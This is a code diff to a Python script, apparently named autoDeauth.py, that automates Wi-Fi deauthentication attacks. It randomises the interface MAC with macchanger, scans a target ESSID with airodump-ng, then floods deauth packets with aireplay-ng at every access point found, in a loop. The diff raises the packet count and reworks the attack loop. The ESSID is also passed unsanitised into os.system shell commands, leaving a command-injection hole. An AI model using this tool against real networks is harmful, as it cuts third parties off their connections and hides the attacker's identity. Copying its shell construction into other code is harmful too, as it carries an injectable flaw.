@@ -8,11 +8,11 @@ def signal_handler(signal, frame):
     print("\nprogram exiting gracefully")
     os.system("iw mon0 del")
     os.system("rm testdump-*")
-    sys.exit(0)
+    
     print("#############################################")
     print("#----We are done, hope you did good things--#")
     print("#############################################")
-
+    sys.exit(0)
 signal.signal(signal.SIGINT, signal_handler)
 
 
@@ -62,7 +62,7 @@ print("#############################################################")
 essid= sys.argv[1]
 
 if essid == "-h":
-    print("Usage: python3 autoDeauth.py {ESSID} {WLAN-interface}")
+    print('Usage: python3 autoDeauth.py "{ESSID}" {WLAN-interface}')
     print("=====================================================")
     exit()
 
@@ -77,8 +77,9 @@ os.system("ifconfig mon0 down")
 os.system("macchanger -r mon0")
 os.system("	ifconfig mon0 up")
 print( "------------mon0 created--------------")
-
-os.system("gnome-terminal -- airodump-ng -w testdump -o csv --essid "+essid+" mon0 ")
+command = 'gnome-terminal -- airodump-ng -w testdump -o csv --essid "'+essid+'" mon0'
+print(command)
+os.system(command)
 input("Press Enter to continue...")
 os.system("killall airodump-ng")
 input="testdump-01.csv"
@@ -129,14 +130,11 @@ for i,row in enumerate(stations_data):
 stored_exception=0
 while True:
     try:
-            for i,row in enumerate(stations_data):
-                ap_mac_ix  = stations_head.index('BSSID')
-                os.system("aireplay-ng -0 5 -a "+row[ap_mac_ix]+" mon0 -D")
-            if stored_exception == 1:
-                break
-            print(stored_exception)
-    except KeyboardInterrupt:
-       stored_exception=1
+        for i,row in enumerate(stations_data):
+            ap_mac_ix  = stations_head.index('BSSID')
+            os.system("aireplay-ng -0 10 -a "+row[ap_mac_ix]+" mon0 -D")
+    except:
+        break
 
 
 """
